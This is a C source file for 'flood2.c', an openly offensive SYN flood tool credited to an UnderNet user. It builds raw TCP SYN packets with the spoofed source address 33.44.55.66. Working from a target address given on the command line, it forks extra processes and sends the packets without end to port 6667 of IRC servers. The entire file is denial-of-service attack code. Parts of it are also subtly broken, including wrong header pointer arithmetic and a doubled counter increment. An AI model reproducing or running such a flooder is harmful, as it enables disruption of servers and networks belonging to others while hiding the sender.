#define __USE_BSD       /* use bsd`s ip header */
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#define __FAVOR_BSD
#include <netinet/tcp.h>
#include <unistd.h>
#include <signal.h>
int outcount=0;
#define P 6667 /* for ircd`s */

unsigned short
csum (unsigned short *buf, int nwords)
{
  unsigned long sum;
  for (sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

void sig_proc(int signum) {
printf("packets:          %d\n\n",outcount);
printf("\t\tflood2.c by SirVic of UnderNet\n\n");
exit(1);
}




int main(int argc,char *argv[]) {
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  char datagram[18024];
  struct ip *iph = (struct ip *) datagram;
  struct tcphdr *tcph = (struct tcphdr *) datagram + sizeof (struct ip);
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons (P);
  sin.sin_addr.s_addr = inet_addr (argv[1]);
  memset (datagram, 0, 18024);  /* zero out the buffer */
printf("started another pid of flood.c\n");
printf("started another pid of flood.c\n");
fork();
fork();
// took from juno.c
   signal(SIGHUP,&sig_proc);
   signal(SIGINT,&sig_proc);
   signal(SIGQUIT,&sig_proc);
   signal(SIGILL,&sig_proc);
   signal(SIGABRT,&sig_proc);
   signal(SIGFPE,&sig_proc);
   signal(SIGSEGV,&sig_proc);
   signal(SIGPIPE,&sig_proc);
   signal(SIGALRM,&sig_proc);
   signal(SIGTERM,&sig_proc);
   signal(SIGUSR1,&sig_proc);
   signal(SIGUSR2,&sig_proc);
   signal(SIGCHLD,&sig_proc);
   signal(SIGCONT,&sig_proc);
   signal(SIGTSTP,&sig_proc);
   signal(SIGTTIN,&sig_proc);
   signal(SIGTTOU,&sig_proc);

/* ip and tcp headers */
  iph->ip_hl = 5;
  iph->ip_v = 4;
  iph->ip_tos = 0;
  iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);
  iph->ip_id = htonl (54321);
  iph->ip_off = 0;
  iph->ip_ttl = 255;
  iph->ip_p = 6;
  iph->ip_sum = 0;
  iph->ip_src.s_addr = inet_addr ("33.44.55.66");        /* we are gona spoof packets from this */
  iph->ip_dst.s_addr = sin.sin_addr.s_addr;
  tcph->th_sport = htons (6667);        /* port from */
  tcph->th_dport = htons (P);
  tcph->th_seq = random ();
  tcph->th_ack = 0;
  tcph->th_x2 = 0;
  tcph->th_off = 0;
  tcph->th_flags = TH_SYN;
  tcph->th_win = htonl (65535);
  tcph->th_sum = 0;
  tcph->th_urp = 0;

  iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);


  {
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
      printf ("Warning: Cannot set HDRINCL!\n");/*  } */     

  while (1)
    {
outcount++;
outcount++;
      if (sendto (s,
                  datagram,
                  iph->ip_len,
                  0,
                  (struct sockaddr *) &sin,
                  sizeof (sin)) < 0)
        printf ("error\n");
}
  return 0;
}
}
